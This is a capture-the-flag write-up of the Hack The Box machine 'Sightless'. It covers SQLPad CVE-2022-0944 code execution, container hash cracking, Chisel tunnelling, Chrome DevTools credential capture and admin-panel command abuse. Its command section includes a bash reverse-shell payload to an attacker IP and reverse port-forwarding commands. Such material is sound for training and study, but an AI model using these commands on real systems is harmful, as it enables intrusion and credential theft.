---
title: HTB Sightless
slug: sightless
lang: en
platform: Hack The Box
category: Container and Admin Panel Abuse
headline: SQLPad RCE, container shadow cracking and internal admin panel command execution
difficulty: Retired
objective: Root / Administrator
date: 2024-10-04
tags: [Linux, SQLPad, Docker, Chisel, Chrome DevTools]
---

# HTB Sightless

## Executive Summary

Sightless exposes SQLPad 6.10.0. CVE-2022-0944 gives command execution through the connection-test endpoint and a reverse shell inside a Docker container.

## Initial Access

Container enumeration reveals user material including password hashes. Cracking the relevant hash recovers SSH credentials for `michael`.

## Internal Pivot

From the host, local ports show an internal service on 8080. Chisel reverse forwarding exposes internal services to the attacker machine, and Chrome remote inspection captures credentials when the user interacts with the portal.

## Privilege Escalation

The admin panel allows defining a PHP-FPM restart command. Setting it to copy `/root/root.txt` into `/tmp`, then changing permissions, exposes the root flag without needing a full root shell.

## Key Commands

```bash
python3 exploit.py -u http://sightless.htb/sqlpad -c "bash -c 'bash -i >& /dev/tcp/10.10.16.3/4444 0>&1'"
```

```bash
chisel server -p 9999 --reverse
```

```bash
./chisel client 10.10.16.3:9999 R:8080:127.0.0.1:8080
```

```bash
cp /root/root.txt /tmp/root.txt
```

```bash
chmod 644 /tmp/root.txt
```

## Evidence Trail

The following screenshots preserve the original lab evidence sequence from the Obsidian notes.

![[Pasted image 20241004105158.png|sightless evidence 01]]

![[Pasted image 20241004105425.png|sightless evidence 02]]

![[Pasted image 20241004112521.png|sightless evidence 03]]

![[Pasted image 20241004112811.png|sightless evidence 04]]

![[Pasted image 20241004112843.png|sightless evidence 05]]

![[Pasted image 20241004120551.png|sightless evidence 06]]

![[Pasted image 20241004113357.png|sightless evidence 07]]

![[Pasted image 20241004122859.png|sightless evidence 08]]

![[Pasted image 20241004123627.png|sightless evidence 09]]

![[Pasted image 20241004123806.png|sightless evidence 10]]

![[Pasted image 20241004124222.png|sightless evidence 11]]

![[Pasted image 20241004130455.png|sightless evidence 12]]

![[Pasted image 20241005164004.png|sightless evidence 13]]

![[Pasted image 20241005164158.png|sightless evidence 14]]

![[Pasted image 20241005164300.png|sightless evidence 15]]

![[Pasted image 20241005170743.png|sightless evidence 16]]

![[Pasted image 20241005170859.png|sightless evidence 17]]

![[Pasted image 20241005171545.png|sightless evidence 18]]

![[Pasted image 20241005171735.png|sightless evidence 19]]
